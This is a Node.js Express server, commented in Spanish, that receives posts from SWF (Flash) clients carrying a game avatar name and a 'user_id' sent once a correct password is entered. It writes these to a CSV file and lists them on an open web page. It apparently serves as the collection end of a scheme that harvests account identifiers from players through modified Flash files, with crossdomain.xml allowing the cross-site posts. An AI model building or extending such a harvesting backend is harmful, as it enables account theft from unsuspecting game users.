const express = require("express");
const fs = require("fs");
const app = express();

let lastUser = ""; // 🔹 Guardará el último User recibido

// 📂 Servir archivos estáticos (como crossdomain.xml)
app.use(express.static("public"));

// Middleware para aceptar JSON y formularios normales
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// 📩 Endpoint para recibir datos desde los SWF
app.post("/recibir", (req, res) => {
  let user_id = "";
  let user_name = "";

  // Detectar tipo de contenido
  if (req.is("application/json")) {
    user_id = (req.body.user_id || "").toString().trim();
    user_name = (req.body.User || "").toString().trim();
  } else if (req.is("application/x-www-form-urlencoded")) {
    user_id = (req.body.user_id || "").toString().trim();
    user_name = (req.body.User || "").toString().trim();
  } else {
    user_id = req.body?.user_id ? req.body.user_id.toString().trim() : "";
    user_name = req.body?.User ? req.body.User.toString().trim() : "";
  }

  // Si vino un User (nombre del keko), lo recordamos
  if (user_name) {
    lastUser = user_name;
    console.log(`🧠 Guardado último User: ${lastUser}`);
  }

  // Si vino un user_id (contraseña correcta), lo guardamos junto al último User
  if (user_id) {
    const cleanId = user_id.replace(/[^\w\-@\.]/g, "");
    const cleanUser = lastUser ? lastUser.replace(/[^\w\s\-@\.]/g, "") : "-";
    const line = `${new Date().toISOString()},${cleanId},${cleanUser}\n`;
    fs.appendFileSync("ids_store.csv", line, { flag: "a" });
    console.log(`✅ Guardado: ${cleanId} (${cleanUser})`);
    res.send("OK");
    return;
  }

  // Si no se envió nada útil
  res.status(400).send("Sin datos válidos");
});

// 📄 Endpoint para ver los IDs guardados (en HTML bonito)
app.get("/lista", (req, res) => {
  const file = "ids_store.csv";

  if (!fs.existsSync(file)) {
    res.send(`
      <html>
      <head><title>Lista vacía</title></head>
      <body style="font-family:sans-serif; text-align:center;">
        <h2>No hay datos todavía 📭</h2>
      </body>
      </html>
    `);
    return;
  }

  const contenido = fs.readFileSync(file, "utf8").trim().split("\n");
  let filas = contenido
    .map((line) => {
      const [fecha, id, user] = line.split(",");
      return `<tr><td>${fecha}</td><td>${id}</td><td>${user}</td></tr>`;
    })
    .join("");

  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.send(`
    <html>
    <head>
      <title>Lista de user_id</title>
      <style>
        body { font-family: sans-serif; margin: 40px; background: #fafafa; color: #333; }
        table { border-collapse: collapse; width: 100%; max-width: 600px; margin: auto; }
        th, td { border: 1px solid #ccc; padding: 8px 12px; text-align: left; }
        th { background: #f0f0f0; }
        h2 { text-align: center; }
      </style>
    </head>
    <body>
      <h2>📋 Lista de user_id recibidos</h2>
      <table>
        <tr><th>Fecha</th><th>User ID</th><th>User</th></tr>
        ${filas}
      </table>
    </body>
    </html>
  `);
});

// 🚀 Iniciar el servidor
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Servidor escuchando en puerto ${PORT}`));
